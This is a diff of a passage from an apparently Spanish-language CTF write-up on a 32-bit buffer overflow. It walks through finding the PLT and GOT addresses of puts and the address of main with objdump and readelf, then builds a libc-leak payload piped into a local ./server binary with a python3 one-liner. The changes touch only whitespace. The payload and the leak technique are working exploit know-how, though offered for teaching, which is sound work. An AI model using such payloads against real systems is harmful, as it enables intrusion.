@@ -19,11 +19,11 @@
 0804a018  00000407 R_386_JUMP_SLOT   00000000   <span class="code-red">puts</span>@GLIBC_2.0  
 </code></pre></div><p>Finalmente, necesitamos indicar una dirección de retorno. Como necesitaremos enviar otro <em>payload</em>, tenemos que ejecutar el programa otra vez pero sin cerrar el proceso. Por tanto, la instrucción de retorno tiene que ser la dirección del <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -d <span class="mtku">server</span> | <span class="code-dark-green">grep</span> main
 08048430 &lt;__libc_start_<span class="code-red">main</span>@plt&gt;:
- 804849d:       e8 8e ff ff ff          call   8048430 &lt;__libc_start_<span class="code-red">main</span>@plt&gt;  
+ 804849d:       e8 8e ff ff ff          call   8048430 &lt;__libc_start_<span class="code-red">main</span>@plt&gt;
 08048640 &lt;<span class="code-red">main</span>&gt;:
 
 <span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">server</span> | <span class="code-dark-green">grep</span> main
-     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_<span class="code-red">main</span>@GLIBC_2.0 (2)
+     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_<span class="code-red">main</span>@GLIBC_2.0 (2)  
     61: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_<span class="code-red">main</span>@@GLIBC_
     73: 08048640    90 FUNC    GLOBAL DEFAULT   14 <span class="code-red">main</span>
 </code></pre></div><p>Ahora que tenemos estos valores, podemos enviar el <em>payload</em>. Este estará formado por 60 bytes de relleno (tomado de <a target="_blank" href="../rip-my-bof">RIP my bof</a>), la dirección de <code>puts</code> en la PLT, la dirección de retorno (<code>main</code>) y el argumento para <code>puts</code> (que es la dirección de <code>puts</code> en la GOT).</p><p>Vamos a probarlo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'import os; os.write(1, b"A" * 60 + b"\x10\x84\x04\x08" + b"\x40\x86\x04\x08" + b"\x18\xa0\x04\x08")'</span> | <span class="code-dark-green">./server</span>  
